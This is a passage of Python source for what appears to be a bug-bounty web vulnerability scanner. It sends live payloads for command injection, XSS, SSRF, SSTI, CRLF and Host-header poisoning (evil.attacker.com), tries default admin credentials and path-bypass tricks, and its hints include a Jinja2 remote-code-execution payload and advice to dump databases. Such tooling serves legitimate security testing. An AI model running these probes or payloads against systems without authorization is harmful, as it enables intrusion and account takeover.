                        remediation="Use parameterized queries. This is exploitable for full DB extraction.",
                        cwe="CWE-89",
                        bounty_hint="Blind SQLi — CRITICAL bounty. Use sqlmap --time-based to confirm and dump DB.")
                return

        res.add("Injection", "OK", "SQL injection probes: no obvious DB errors or time delays")

    def _test_ssrf(self, res: ScanResult, base: str, path: str) -> None:
        for param in self.SSRF_PARAMS:
            for probe_url, label in self.SSRF_PROBES[:4]:
                r = get(f"{base}{path}", params={param: probe_url}, timeout=SHORT_TIMEOUT, allow_redirects=False)
                if r:
                    body = _body(r)
                    hdrs = _hdrs(r)
                    # Check if we got redirected to the probe or got internal content
                    loc = hdrs.get("location", "")
                    if any(s in body for s in self.SSRF_SUCCESS) or (probe_url in loc):
                        res.add("Injection", "CRITICAL",
                                f"SSRF via ?{param}= ({label})",
                                detail=f"Internal resource accessed. Probe: {probe_url}",
                                evidence=f"GET ?{param}={probe_url} -> response contains internal data",
                                remediation="Validate and whitelist URLs server-side. Block internal IP ranges (127.x, 10.x, 172.16-31.x, 192.168.x, 169.254.x).",
                                cwe="CWE-918",
                                bounty_hint="SSRF to AWS metadata is CRITICAL — can leak IAM credentials.")
                        return
        res.add("Injection", "OK", "SSRF probes: no obvious internal access found")

    def _test_ssti(self, res: ScanResult, base: str, path: str) -> None:
        for payload, expected, engine in self.SSTI_PAYLOADS:
            for param in ["name", "q", "search", "msg", "text", "template", "input"]:
                r = get(f"{base}{path}", params={param: payload})
                if r and expected in _body(r):
                    # FALSE-POSITIVE CONFIRMATION: send a different arithmetic
                    # payload. If only the first is echoed, it's just reflection.
                    # If the template engine truly evaluates, the second result
                    # will differ from the first.
                    confirm_ok = False
                    if engine == "Jinja2/Twig/Django" and "7*7" in payload:
                        r2 = get(f"{base}{path}", params={param: "{{7*8}}"})
                        confirm_ok = r2 and "56" in _body(r2)
                    if confirm_ok:
                        res.add("Injection", "CRITICAL",
                                f"Server-Side Template Injection ({engine}) via ?{param}=",
                                detail=f"Payload {payload!r} evaluated to {expected!r}. Confirmed with {{7*8}}->56.",
                                evidence=f"GET ?{param}={payload} -> body contains '{expected}'",
                                remediation="Never pass user input to template engines. Use sandboxed rendering.",
                                cwe="CWE-94",
                                bounty_hint="SSTI -> RCE in most cases. CRITICAL bounty. Use {{config.__class__.__init__.__globals__['os'].popen('id').read()}} on Jinja2.")
                    else:
                        res.add("Injection", "MEDIUM",
                                f"Possible SSTI reflection via ?{param}= (needs manual verify)",
                                detail=f"Payload {payload!r} found in body but confirmation payload didn't evaluate.",
                                evidence=f"GET ?{param}={payload} -> '{expected}' in body",
                                cwe="CWE-94")
                    return
        res.add("Injection", "OK", "SSTI probes: no template evaluation detected")

    def _test_crlf(self, res: ScanResult, base: str, path: str) -> None:
        for pl in self.CRLF_PAYLOADS:
            url = f"{base}{path}?q={pl}"
            r = get(url, allow_redirects=False)
            if r:
                hdrs = _hdrs(r)
                if "x-injected" in hdrs:
                    res.add("Injection", "HIGH",
                            "CRLF Header Injection via query parameter",
                            detail=f"Injected header 'X-Injected' appears in response. Payload: {pl!r}",
                            evidence=f"GET ?q={pl} -> X-Injected header in response",
                            remediation="Strip/encode \\r and \\n from all user input used in HTTP headers.",
                            cwe="CWE-113",
                            bounty_hint="CRLF -> cookie injection, XSS via reflected headers, cache poisoning.")
                    return
        res.add("Injection", "OK", "CRLF injection probes: no header injection found")

    def _test_cmdi(self, res: ScanResult, base: str, path: str) -> None:
        # Time-based command injection (sleep)
        payloads = [
            "; sleep 3",
            "| sleep 3",
            "` sleep 3 `",
            "& timeout 3",
            "$(sleep 3)",
        ]
        for pl in payloads[:2]:
            for param in ["cmd", "exec", "command", "run", "ping", "host", "ip"]:
                start = time.time()
                r = get(f"{base}{path}", params={param: pl}, timeout=7)
                elapsed = time.time() - start
                if elapsed >= 2.8:
                    res.add("Injection", "CRITICAL",
                            f"Command Injection (time-based) via ?{param}=",
                            detail=f"Response delayed {elapsed:.1f}s with sleep payload. Payload: {pl!r}",
                            evidence=f"GET ?{param}={pl} -> {elapsed:.1f}s delay",
                            remediation="Never pass user input to shell commands. Use language-native APIs.",
                            cwe="CWE-78",
                            bounty_hint="RCE — CRITICAL bounty. Enumerate with id, whoami, hostname.")
                    return


# ═══════════════════════════════════════════════════════════════════════════════
# 6. Advanced XSS Testing
# ═══════════════════════════════════════════════════════════════════════════════

class XSSScanner:
    """Reflected XSS, DOM sink hints, polyglot payloads, event handlers."""

    PAYLOADS = [
        '<script>alert("XSS")</script>',
        '"><script>alert(1)</script>',
        "'><img src=x onerror=alert(1)>",
        '<svg onload=alert(1)>',
        '"><svg/onload=alert(1)>',
        'javascript:alert(1)//',
        '"><body onload=alert(1)>',
        '{{7*7}}',   # also tests SSTI
        '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
        # Polyglot
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>"
    ]

    DOM_SINK_PATTERNS = [
        r"document\.write\s*\(",
        r"innerHTML\s*=",
        r"outerHTML\s*=",
        r"eval\s*\(",
        r"setTimeout\s*\(",
        r"setInterval\s*\(",
        r"location\.href\s*=",
        r"location\.replace\s*\(",
        r"document\.domain\s*=",
        r"src\s*=\s*['\"]?\s*\+",
    ]

    def run(self, res: ScanResult, parsed: urllib.parse.ParseResult) -> None:
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path or "/"

        # ── Reflected XSS via GET params ────────────────────────────────────
        reflected = False
        for pl in self.PAYLOADS[:5]:
            for param in ["q", "search", "query", "s", "name", "msg", "text", "input", "term"]:
                r = get(f"{base}{path}", params={param: pl})
                if r:
                    body = _body(r)
                    # Check if payload appears unencoded in body
                    if pl in body:
                        # FALSE-POSITIVE CONFIRMATION: send a second payload.
                        # If both appear identically, the app is just echoing
                        # input — not XSS.  Real XSS would transform/break
                        # certain characters.
                        second_pl = '<script>alert("XSS")</script>' if pl != '<script>alert("XSS")</script>' else '"><img src=x onerror=alert(1)>'
                        r2 = get(f"{base}{path}", params={param: second_pl})
                        both_echoed = r2 and second_pl in _body(r2)
                        csp = _hdrs(r).get("content-security-policy", "")
                        has_csp = bool(csp and "script-src" in csp.lower())
                        if both_echoed:
                            sev = "LOW" if has_csp else "MEDIUM"
                            res.add("XSS", sev,
                                    f"Input echoed via ?{param}= (likely reflection, not XSS)",
                                    detail=f"Both payloads echoed identically. App reflects user input without XSS opportunity.",
                                    evidence=f"Multiple payloads reflected unchanged",
                                    cwe="CWE-79")
                        else:
                            sev = "MEDIUM" if has_csp else "HIGH"
                            res.add("XSS", sev,
                                    f"Reflected XSS via ?{param}= ({'CSP present' if has_csp else 'no CSP'})",
                                    detail=f"Payload reflected unencoded: {pl[:60]}",
                                    evidence=f"GET ?{param}={pl[:40]} -> payload in body unescaped",
                                    remediation="Encode all user output in proper context (HTML, JS, URL, CSS). Implement strict CSP.",
                                    cwe="CWE-79",
                                    bounty_hint="Reflected XSS is typically MEDIUM-HIGH. CSP bypass elevates it. Check for POST-based XSS too.")
                        reflected = True
                        break
            if reflected:
                break

        if not reflected:
            res.add("XSS", "OK", "Reflected XSS: no unencoded reflection found in GET params")

        # ── DOM-based XSS hints in source ────────────────────────────────────
        r = get(f"{base}{path}")
        if r:
            body = _body(r)
            dom_sinks_found = []
            for pattern in self.DOM_SINK_PATTERNS:
                matches = re.findall(pattern, body, re.IGNORECASE)
                if matches:
                    dom_sinks_found.append(pattern.replace(r"\s*", " ").replace(r"\(", "("))

            if dom_sinks_found:
                res.add("XSS", "MEDIUM",
                        f"Potential DOM XSS sinks found in source ({len(dom_sinks_found)} patterns)",
                        detail=f"Dangerous sinks: {', '.join(dom_sinks_found[:5])}",
                        remediation="Audit all client-side code that passes URL fragments/params to these sinks. Use textContent instead of innerHTML.",
                        cwe="CWE-79",
                        bounty_hint="DOM XSS often bypasses server-side WAFs. Manual review required.")

        # ── Stored XSS hunting paths ─────────────────────────────────────────
        stored_paths = ["/comment", "/review", "/feedback", "/contact",
                        "/api/comments", "/api/messages", "/api/feedback"]
        for path_candidate in stored_paths:
            r2 = post(f"{base}{path_candidate}",
                     json_body={"message": self.PAYLOADS[0], "comment": self.PAYLOADS[0], "body": self.PAYLOADS[0]},
                     timeout=SHORT_TIMEOUT)
            if r2 and r2.status_code in (200, 201):
                res.add("XSS", "MEDIUM",
                        f"Potential stored XSS endpoint accepts POST: {path_candidate}",
                        detail=f"POST to {path_candidate} returned {r2.status_code}. Manual verification needed.",
                        bounty_hint="Submit XSS payload and check if it renders when viewed by another user — stored XSS is HIGH/CRITICAL.")


# ═══════════════════════════════════════════════════════════════════════════════
# 7. Host Header & Cache Poisoning
# ═══════════════════════════════════════════════════════════════════════════════

class HostHeaderScanner:
    """Host header injection, X-Forwarded-Host cache poisoning, password reset poisoning."""

    def run(self, res: ScanResult, parsed: urllib.parse.ParseResult) -> None:
        base = f"{parsed.scheme}://{parsed.netloc}"
        host = parsed.hostname or ""

        # ── Host header injection ────────────────────────────────────────────
        evil_host = "evil.attacker.com"
        r = get(base, extra_headers={"Host": evil_host}, allow_redirects=False)
        if r:
            body = _body(r)
            hdrs = _hdrs(r)
            if evil_host in body:
                res.add("Host Header", "HIGH",
                        "Host header reflected in response body",
                        detail=f"Value 'evil.attacker.com' appears in response. Password reset link poisoning possible.",
                        evidence=f"Host: evil.attacker.com -> response body contains 'evil.attacker.com'",
                        remediation="Validate Host header against an allowlist. Use SERVER_NAME/absolute URL for reset links.",
                        cwe="CWE-644",
                        bounty_hint="Host header injection -> password reset poisoning is HIGH on most programs.")
            loc = hdrs.get("location", "")
            if evil_host in loc:
                res.add("Host Header", "CRITICAL",
                        "Host header injection causes redirect to attacker domain",
                        detail=f"Location: {loc}",
                        evidence=f"Host: evil.attacker.com -> Location: {loc}",
                        remediation="Never use Host header value in redirect URLs.",
                        cwe="CWE-644",
                        bounty_hint="Open redirect via Host injection — CRITICAL if on password reset flow.")

        # ── X-Forwarded-Host cache poisoning ────────────────────────────────
        for fwd_header in ["X-Forwarded-Host", "X-Host", "X-Forwarded-Server", "X-HTTP-Host-Override"]:
            r2 = get(base, extra_headers={fwd_header: evil_host})
            if r2 and evil_host in _body(r2):
                res.add("Host Header", "HIGH",
                        f"Cache Poisoning via {fwd_header}",
                        detail=f"Value 'evil.attacker.com' reflected via {fwd_header} header.",
                        evidence=f"{fwd_header}: evil.attacker.com -> reflected in body",
                        remediation=f"Strip/validate {fwd_header} before trusting it for URL generation.",
                        cwe="CWE-444",
                        bounty_hint="Web cache poisoning via forwarded headers — can affect all users sharing cache.")

        # ── X-Original-URL / X-Rewrite-URL bypass ───────────────────────────
        for override in ["X-Original-URL", "X-Rewrite-URL"]:
            r3 = get(f"{base}/", extra_headers={override: "/admin"})
            if r3 and r3.status_code == 200:
                body3 = _body(r3).lower()
                if "admin" in body3 or "dashboard" in body3 or "welcome" in body3:
                    res.add("Host Header", "HIGH",
                            f"URL override bypass via {override}: /admin",
                            detail=f"{override}: /admin -> 200 response with admin content hints.",
                            remediation=f"Disallow {override} header or validate it strictly.",
                            cwe="CWE-284",
                            bounty_hint="WAF/middleware bypass — can access forbidden paths.")

        # ── Password reset Host injection ────────────────────────────────────
        for path in ["/forgot-password", "/password-reset", "/api/forgot", "/api/reset-password", "/reset"]:
            r4 = post(f"{base}{path}",
                     json_body={"email": "test@test.com"},
                     extra_headers={"Host": evil_host},
                     timeout=SHORT_TIMEOUT)
            if r4 and r4.status_code in (200, 201, 202):
                res.add("Host Header", "HIGH",
                        f"Password reset endpoint accepts manipulated Host header: {path}",
                        detail=f"POST {path} with Host: evil.attacker.com returned {r4.status_code}. If reset link uses Host header, attacker gets the link.",
                        remediation="Hardcode the application domain for password reset URLs.",
                        cwe="CWE-640",
                        bounty_hint="Password reset poisoning — HIGH bounty. Verify by checking if reset email contains evil.attacker.com.")


# ═══════════════════════════════════════════════════════════════════════════════
# 8. GraphQL Security
# ═══════════════════════════════════════════════════════════════════════════════

class GraphQLScanner:
    """Introspection, batch query abuse, field suggestion, IDOR hints."""

    GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/v1/graphql", "/gql",
                     "/graph", "/api/graph", "/query", "/api/query"]

    INTROSPECTION_QUERY = '{"query": "{ __schema { types { name } } }"}'
    BATCH_QUERY = '[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]'

    def run(self, res: ScanResult, parsed: urllib.parse.ParseResult) -> None:
        base = f"{parsed.scheme}://{parsed.netloc}"

        graphql_url = None
        for path in self.GRAPHQL_PATHS:
            r = post(f"{base}{path}",
                    data=self.INTROSPECTION_QUERY,
                    extra_headers={"Content-Type": "application/json"},
                    timeout=SHORT_TIMEOUT)
            if r and r.status_code == 200:
                try:
                    data = r.json()
                    if "data" in data or "errors" in data:
                        graphql_url = f"{base}{path}"
                        break
                except Exception:
                    pass

        if not graphql_url:
            res.add("GraphQL", "INFO", "No GraphQL endpoint detected at common paths")
            return

        res.add("GraphQL", "INFO", f"GraphQL endpoint found: {graphql_url}")

        # ── Introspection enabled ─────────────────────────────────────────────
        r = post(graphql_url, data=self.INTROSPECTION_QUERY,
                extra_headers={"Content-Type": "application/json"})
        if r:
            try:
                data = r.json()
                if "data" in data and "__schema" in str(data):
                    types = [t["name"] for t in data.get("data", {}).get("__schema", {}).get("types", [])
                             if not t["name"].startswith("__")]
                    res.add("GraphQL", "MEDIUM",
                            "GraphQL introspection enabled (schema exposed)",
                            detail=f"Schema types: {', '.join(types[:10])}{'...' if len(types)>10 else ''}",
                            evidence=f"POST {graphql_url} introspection -> full schema returned",
                            remediation="Disable introspection in production. Use persisted queries.",
                            cwe="CWE-200",
                            bounty_hint="Introspection reveals entire API schema — map all queries/mutations for IDOR and privilege escalation testing.")
                    # Check for sensitive type names
                    sensitive_types = [t for t in types if any(s in t.lower() for s in
                                      ["user", "admin", "password", "token", "secret", "private", "internal", "payment"])]
                    if sensitive_types:
                        res.add("GraphQL", "HIGH",
                                f"Sensitive GraphQL types exposed: {', '.join(sensitive_types[:5])}",
                                detail="These types may expose sensitive operations.",
                                bounty_hint="Test IDOR on these types: { user(id: 2) { email password token } }")
            except Exception:
                pass

        # ── Batch query abuse (rate limit bypass) ────────────────────────────
        r2 = post(graphql_url, data=self.BATCH_QUERY,
                 extra_headers={"Content-Type": "application/json"})
        if r2 and isinstance(r2.json() if hasattr(r2, "json") else None, list):
            try:
                if isinstance(r2.json(), list) and len(r2.json()) == 5:
                    res.add("GraphQL", "MEDIUM",
                            "GraphQL batch queries enabled (rate limit bypass)",
                            detail="Multiple queries in one request all return results.",
                            remediation="Limit batch query depth and count. Add per-query rate limiting.",
                            bounty_hint="Use batch queries to bypass rate limiting on login/OTP/password reset endpoints.")
            except Exception:
                pass

        # ── Field suggestion (info disclosure) ───────────────────────────────
        r3 = post(graphql_url,
                 data='{"query": "{ users { pasword } }"}',
                 extra_headers={"Content-Type": "application/json"})
        if r3:
            try:
                err_body = r3.json()
                err_str = str(err_body)
                if "Did you mean" in err_str or "suggestion" in err_str.lower():
                    res.add("GraphQL", "LOW",
                            "GraphQL field suggestions enabled (info disclosure)",
                            detail="Error messages suggest valid field names to attackers.",
                            remediation='Set "suggestions: false" in GraphQL server config.',
                            bounty_hint="Use typos to enumerate all field names even without introspection.")
            except Exception:
                pass


# ═══════════════════════════════════════════════════════════════════════════════
# 9. Rate Limiting & Auth Bypass
# ═══════════════════════════════════════════════════════════════════════════════

class AuthScanner:
    """Rate limiting, HTTP method bypass, 401->403->200 bypass, default creds."""

    DEFAULT_CREDS = [
        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("admin", "admin123"), ("root", "root"), ("root", "password"),
        ("administrator", "administrator"), ("test", "test"), ("guest", "guest"),
        ("admin", ""), ("admin", "1234"), ("user", "user"),
    ]

    def run(self, res: ScanResult, parsed: urllib.parse.ParseResult) -> None:
        base = f"{parsed.scheme}://{parsed.netloc}"

        # ── Rate limiting check on login ─────────────────────────────────────
        login_paths = ["/login", "/api/login", "/api/auth/login", "/auth/login",
                       "/signin", "/api/signin", "/user/login"]
        for lpath in login_paths:
            responses = []
            for i in range(5):
                r = post(f"{base}{lpath}",
                        json_body={"username": f"test{i}@x.com", "password": "wrongpassword123!"},
                        timeout=SHORT_TIMEOUT)
                if r:
                    responses.append(r.status_code)

            if responses:
                blocked = any(c in (429, 403, 423, 503) for c in responses[3:])
                if not blocked and len(responses) >= 4:
                    res.add("Auth", "HIGH",
                            f"No rate limiting on login endpoint: {lpath}",
                            detail=f"Sent 5 rapid requests, all returned: {responses}. No 429/lockout detected.",
                            remediation="Implement rate limiting, account lockout, and CAPTCHA on authentication endpoints.",
                            cwe="CWE-307",
                            bounty_hint="Missing rate limiting -> credential stuffing/brute-force attack possible. HIGH on most programs.")
                else:
                    res.add("Auth", "OK", f"Rate limiting detected on {lpath} (blocked after attempts)")
                break

        # ── HTTP method bypass (401 -> try PUT/POST/DELETE) ──────────────────
        admin_paths = ["/admin", "/admin/users", "/api/admin", "/dashboard",
                       "/api/v1/admin", "/management", "/api/users"]
        for apath in admin_paths:
            r_get = get(f"{base}{apath}", allow_redirects=False)
            if r_get and r_get.status_code in (401, 403):
                for method in ["POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS",
                               "TRACE", "CONNECT", "PROPFIND", "PROPPATCH"]:
                    r2 = req(method, f"{base}{apath}", timeout=SHORT_TIMEOUT)
                    if r2 and r2.status_code == 200:
                        res.add("Auth", "HIGH",
                                f"HTTP method bypass: GET {apath} = {r_get.status_code}, {method} = 200",
                                detail=f"GET returns 401/403 but {method} returns 200.",
                                remediation="Apply consistent authorization checks across all HTTP methods.",
                                cwe="CWE-284",
                                bounty_hint="Method bypass is HIGH — can bypass WAF and middleware access control.")
                        break

                # Try path bypass tricks
                bypass_paths = [
                    f"{apath}%20", f"{apath}%09", f"{apath}/.", f"/{apath[1:]}",
                    f"//{apath}", f"{apath}..;/", f"{apath}?", f"{apath}#",
                    f"{apath}%2f.", f"%2e{apath}",
                ]
                for bp in bypass_paths:
                    r3 = get(f"{base}{bp}", allow_redirects=False)
                    if r3 and r3.status_code == 200:
                        res.add("Auth", "HIGH",
                                f"Path normalization bypass: {apath} -> {bp}",
                                detail=f"Original {apath} = 403, but {bp} = 200",
                                remediation="Normalize paths before authorization checks.",
                                cwe="CWE-22",
                                bounty_hint="Path traversal/normalization bypass — HIGH bounty.")
                        break

        # ── Default credentials on admin panels ──────────────────────────────
        for lpath in ["/admin", "/login", "/wp-login.php", "/admin/login"]:
            r = get(f"{base}{lpath}", timeout=SHORT_TIMEOUT)
            if r and r.status_code == 200:
                for username, password in self.DEFAULT_CREDS[:6]:
                    r2 = post(f"{base}{lpath}",
                             data={"username": username, "password": password,
                                   "user": username, "pass": password,
                                   "log": username, "pwd": password},
                             allow_redirects=False,
                             timeout=SHORT_TIMEOUT)
                    if r2:
                        # Successful login: redirect to dashboard or session cookie set
                        if r2.status_code in (301, 302) and any(
                            k in r2.headers.get("Location", "").lower()
                            for k in ["dashboard", "admin", "home", "panel"]
                        ):
                            res.add("Auth", "CRITICAL",
                                    f"Default credentials work on {lpath}: {username}/{password}",
                                    detail=f"Login with {username}/{password} -> redirect to {r2.headers.get('Location')}",
                                    remediation="Change all default credentials immediately.",
                                    cwe="CWE-798",
                                    bounty_hint="Default creds are CRITICAL — immediate account takeover.")
                            return
                break


# ═══════════════════════════════════════════════════════════════════════════════
# 10. Advanced SSL/TLS Audit
# ═══════════════════════════════════════════════════════════════════════════════

class TLSScanner:
    """Protocol, cipher suite, cert chain, HSTS preload, cert transparency."""

    WEAK_CIPHERS = [
        "RC4", "DES", "3DES", "EXPORT", "NULL", "ANON", "MD5",
        "RC2", "IDEA", "SEED",
    ]

    def run(self, res: ScanResult, parsed: urllib.parse.ParseResult) -> None:
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)

        if parsed.scheme != "https":
            res.add("TLS", "HIGH", "Site not served over HTTPS",
                    remediation="Deploy TLS and redirect all HTTP to HTTPS.",
                    cwe="CWE-319",
                    bounty_hint="Unencrypted transport — LOW-MEDIUM bounty. Check for sensitive data over HTTP.")
            return

        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.create_connection((host, port), timeout=TIMEOUT),
                                 server_hostname=host) as conn:
                cert = conn.getpeercert()
                cipher_name, proto, bits = conn.cipher()
                res.meta.update({"ssl_proto": proto, "ssl_cipher": cipher_name, "ssl_bits": bits})

            # Protocol
            if proto in ("TLSv1", "TLSv1.1"):
                res.add("TLS", "HIGH", f"Deprecated TLS version: {proto}",
                        remediation="Disable TLS 1.0 and 1.1. Require TLS 1.2+.",
                        cwe="CWE-326")
            elif proto in ("SSLv2", "SSLv3"):
                res.add("TLS", "CRITICAL", f"CRITICAL: {proto} enabled (POODLE/DROWN attack)",
                        remediation="Disable SSLv2/SSLv3 immediately.",
                        cwe="CWE-326",
                        bounty_hint="POODLE/DROWN — CRITICAL infrastructure vulnerability.")
            else:
                res.add("TLS", "OK", f"Protocol: {proto} | Cipher: {cipher_name} ({bits}-bit)")

            # Weak ciphers
            for wc in self.WEAK_CIPHERS:
                if wc in cipher_name.upper():
                    res.add("TLS", "HIGH", f"Weak cipher suite: {cipher_name}",
                            remediation="Use only AEAD cipher suites (AES-GCM, CHACHA20-POLY1305).",
                            cwe="CWE-327")
                    break

            # Key size
            if bits and bits < 128:
                res.add("TLS", "CRITICAL", f"Critically weak key size: {bits}-bit",
                        remediation="Use 256-bit keys minimum.",
                        cwe="CWE-326")
            elif bits and bits < 256:
                res.add("TLS", "LOW", f"Key size could be stronger: {bits}-bit",
                        remediation="Prefer 256-bit ECDH key exchange.")

            # Cert expiry
            not_after_str = cert.get("notAfter", "")
            if not_after_str:
                not_after = datetime.strptime(not_after_str, "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
                days_left = (not_after - datetime.now(timezone.utc)).days
                if days_left < 0:
                    res.add("TLS", "CRITICAL", f"Certificate EXPIRED {abs(days_left)} days ago!",
                            remediation="Renew certificate immediately.",
                            cwe="CWE-298")
                elif days_left < 14:
                    res.add("TLS", "HIGH", f"Certificate expiring in {days_left} days",
                            remediation="Renew urgently.")
                else:
                    res.add("TLS", "OK", f"Certificate valid for {days_left} more days")

            # Hostname mismatch check
            sans = [v for _, v in cert.get("subjectAltName", [])]
            san_match = any(host.endswith(san.lstrip("*")) for san in sans)
            if not san_match and host not in " ".join(sans):
                res.add("TLS", "HIGH", f"Certificate SAN mismatch for {host}",
                        detail=f"SANs: {', '.join(sans[:5])}",
                        cwe="CWE-295")
            else:
                res.add("TLS", "OK", f"Certificate SANs match (covers {host})")

        except ssl.SSLCertVerificationError as e:
            res.add("TLS", "CRITICAL", "Certificate verification FAILED",
                    detail=str(e),
                    remediation="Replace self-signed or misconfigured certificate.",
                    cwe="CWE-295")
        except Exception as e:
            res.add("TLS", "MEDIUM", f"TLS error: {type(e).__name__}: {e}")


# ═══════════════════════════════════════════════════════════════════════════════
# 11. Security Headers Deep Audit
# ═══════════════════════════════════════════════════════════════════════════════

class HeadersScanner:
    """Full Mozilla Observatory-style security header audit."""

    def run(self, res: ScanResult, parsed: urllib.parse.ParseResult) -> None:
        r = get(parsed.geturl())
        if not r:
            res.add("Headers", "MEDIUM", "Could not fetch headers")
            return

        hdrs = _hdrs(r)
        res.meta["status_code"] = r.status_code
        res.add("Headers", "INFO", f"HTTP {r.status_code}")

        # HSTS
        hsts = hdrs.get("strict-transport-security", "")
        if not hsts:
            res.add("Headers", "HIGH", "Missing HSTS",
                    remediation="Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
                    cwe="CWE-319")
        else:
            age = int(m.group(1)) if (m := re.search(r"max-age=(\d+)", hsts, re.I)) else 0
            preload = "preload" in hsts.lower()
            incl_sub = "includesubdomains" in hsts.lower()
            if age < 15552000:
                res.add("Headers", "MEDIUM", f"HSTS max-age too low: {age}s",
                        remediation="Set max-age=31536000 (1 year) minimum.")
            else:
                res.add("Headers", "OK", f"HSTS: max-age={age}d {'(preload)' if preload else ''} {'(includeSubDomains)' if incl_sub else ''}")
            if not incl_sub:
                res.add("Headers", "LOW", "HSTS missing includeSubDomains",
                        remediation="Add includeSubDomains to HSTS.")
            if not preload:
                res.add("Headers", "INFO", "HSTS not in preload list",
                        remediation="Submit to HSTS preload list at hstspreload.org after setting preload directive.")

        # CSP
        csp = hdrs.get("content-security-policy", "")
        if not csp:
            res.add("Headers", "HIGH", "Missing Content-Security-Policy",
                    remediation="Implement strict CSP. Start with: default-src 'none'; script-src 'self'; ...",
                    cwe="CWE-1021")
        else:
            # Check for unsafe directives
            if "'unsafe-inline'" in csp:
                res.add("Headers", "MEDIUM", "CSP contains 'unsafe-inline' (XSS risk)",
                        detail=f"CSP: {csp[:100]}",
                        remediation="Remove 'unsafe-inline'. Use nonces or hashes instead.")
            if "'unsafe-eval'" in csp:
                res.add("Headers", "MEDIUM", "CSP contains 'unsafe-eval' (XSS risk)",
                        remediation="Remove 'unsafe-eval'. Avoid eval() in code.")
            if "http:" in csp or "https:" in csp:
                res.add("Headers", "LOW", "CSP allows all HTTPS/HTTP sources (too broad)",
                        remediation="Specify exact allowed domains in CSP directives.")
            if "*" in csp:
                res.add("Headers", "HIGH", "CSP wildcard (*) used — CSP is effectively bypassed",
                        remediation="Replace * with specific trusted domains.",
                        bounty_hint="Wildcard CSP -> XSS via any CDN source.")
            if "frame-ancestors" not in csp.lower() and not hdrs.get("x-frame-options"):
                res.add("Headers", "MEDIUM", "No clickjacking protection (no frame-ancestors, no X-Frame-Options)",
                        remediation="Add CSP: frame-ancestors 'none' or X-Frame-Options: DENY.",
                        cwe="CWE-1021")

        # Other headers
        checks = [
            ("x-content-type-options", "nosniff", "MEDIUM",
             "Missing X-Content-Type-Options: nosniff", "CWE-430"),
            ("referrer-policy", None, "LOW",
             "Missing Referrer-Policy (leaks URLs to third parties)", ""),
            ("permissions-policy", None, "LOW",
             "Missing Permissions-Policy (camera/mic/geo not restricted)", ""),
        ]
        for hname, expected_val, sev, msg, cwe in checks:
            val = hdrs.get(hname, "")
            if not val:
                res.add("Headers", sev, msg,
                        remediation=f"Set {hname} header.",
                        cwe=cwe)
            elif expected_val and expected_val.lower() not in val.lower():
                res.add("Headers", sev, f"{hname} value may be misconfigured: {val[:60]}")
            else:
                res.add("Headers", "OK", f"{hname}: {val[:60]}")

        # Information disclosure
        for leak_header in ["server", "x-powered-by", "x-aspnet-version",
                            "x-aspnetmvc-version", "via", "x-generator"]:
            val = hdrs.get(leak_header, "")
            if val:
                res.add("Headers", "LOW", f"Version disclosure: {leak_header}: {val}",
                        remediation=f"Remove or suppress the {leak_header} header.",
                        cwe="CWE-200")


# ═══════════════════════════════════════════════════════════════════════════════
# 12. Sensitive Path & File Discovery
# ═══════════════════════════════════════════════════════════════════════════════

class PathScanner:
    """35 critical sensitive paths + backup file patterns."""

    PATHS = [
        (".git/config",        "CRITICAL", "Git config exposed (may contain remote URL/credentials)"),
        (".git/HEAD",          "CRITICAL", "Git HEAD exposed — full source code may be downloadable"),
        (".env",               "CRITICAL", ".env file exposed (API keys, DB credentials, secrets)"),
        (".env.local",         "CRITICAL", ".env.local exposed"),
        (".env.production",    "CRITICAL", ".env.production exposed"),
        (".htpasswd",          "CRITICAL", ".htpasswd password file exposed"),
        ("wp-config.php.bak",  "CRITICAL", "WordPress config backup exposed"),
        ("backup.sql",         "CRITICAL", "SQL database backup exposed"),
        ("dump.sql",           "CRITICAL", "SQL dump exposed"),
        ("database.sql",       "CRITICAL", "SQL database file exposed"),
        ("config.php.bak",     "HIGH",     "PHP config backup exposed"),
        ("config.bak",         "HIGH",     "Config backup exposed"),
        ("web.config.bak",     "HIGH",     "ASP.NET config backup exposed"),
        ("phpmyadmin/",        "HIGH",     "phpMyAdmin panel exposed"),
        ("server-status",      "HIGH",     "Apache mod_status exposed"),
        ("server-info",        "HIGH",     "Apache mod_info exposed"),
        ("package.json",       "HIGH",     "package.json exposed (reveals all npm deps + versions)"),
        ("package-lock.json",  "HIGH",     "package-lock.json exposed"),
        ("Dockerfile",         "HIGH",     "Dockerfile exposed"),
        ("docker-compose.yml", "HIGH",     "docker-compose.yml exposed"),
        (".DS_Store",          "MEDIUM",   ".DS_Store exposed — reveals directory structure"),
        ("crossdomain.xml",    "MEDIUM",   "crossdomain.xml — Flash cross-domain policy"),
        ("swagger.json",       "MEDIUM",   "Swagger API spec exposed — full API map"),
        ("openapi.json",       "MEDIUM",   "OpenAPI spec exposed"),
        ("swagger-ui.html",    "MEDIUM",   "Swagger UI exposed"),
        ("api-docs",           "MEDIUM",   "API documentation exposed"),
        ("actuator",           "HIGH",     "Spring Boot Actuator exposed"),
        ("actuator/env",       "CRITICAL", "Spring Boot /actuator/env exposes all env vars!"),
        ("actuator/health",    "LOW",      "Spring Boot health endpoint exposed"),
        ("debug",              "MEDIUM",   "Debug endpoint exposed"),
        ("trace",              "MEDIUM",   "Trace endpoint accessible"),
        ("robots.txt",         "INFO",     "robots.txt (review Disallow entries for hidden paths)"),
        ("sitemap.xml",        "INFO",     "sitemap.xml found"),
        (".well-known/security.txt", "OK", "security.txt found — responsible disclosure policy"),
        ("CHANGELOG.md",       "LOW",      "CHANGELOG exposed — reveals version history"),
        ("README.md",          "LOW",      "README exposed"),
        ("phpinfo.php",        "CRITICAL", "phpinfo() page exposed — full server config disclosure"),
        ("info.php",           "CRITICAL", "info.php phpinfo exposed"),
